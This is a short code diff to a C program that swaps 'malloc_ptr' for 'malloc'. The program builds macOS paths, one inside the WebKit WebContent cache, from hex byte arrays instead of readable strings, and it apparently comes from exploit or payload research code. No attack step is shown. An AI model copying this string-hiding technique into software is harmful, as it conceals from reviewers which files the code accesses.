@@ -40,7 +40,7 @@ int main(void) {
     }
     
     // "/Library/Caches/com.apple.WebKit.WebContent/log.txt"
-    char* relativePath = malloc_ptr(52);
+    char* relativePath = malloc(52);
     static GLOB char relativePath_0[] = {0x2f, 0x4c, 0x69, 0x62, 0x72, 0x61};
     static GLOB char relativePath_1[] = {0x72, 0x79, 0x2f, 0x43, 0x61, 0x63};
     static GLOB char relativePath_2[] = {0x68, 0x65, 0x73, 0x2f, 0x63, 0x6f};
@@ -105,7 +105,7 @@ int main(void) {
     newLine = malloc(1);
     newLine[0] = 0xA;
     
-    char* test = malloc_ptr(58);
+    char* test = malloc(58);
     static GLOB char test_0[] = {0x2f, 0x53, 0x79, 0x73, 0x74, 0x65};
     static GLOB char test_1[] = {0x6d, 0x2f, 0x4c, 0x69, 0x62, 0x72};
     static GLOB char test_2[] = {0x61, 0x72, 0x79, 0x2f, 0x50, 0x72};
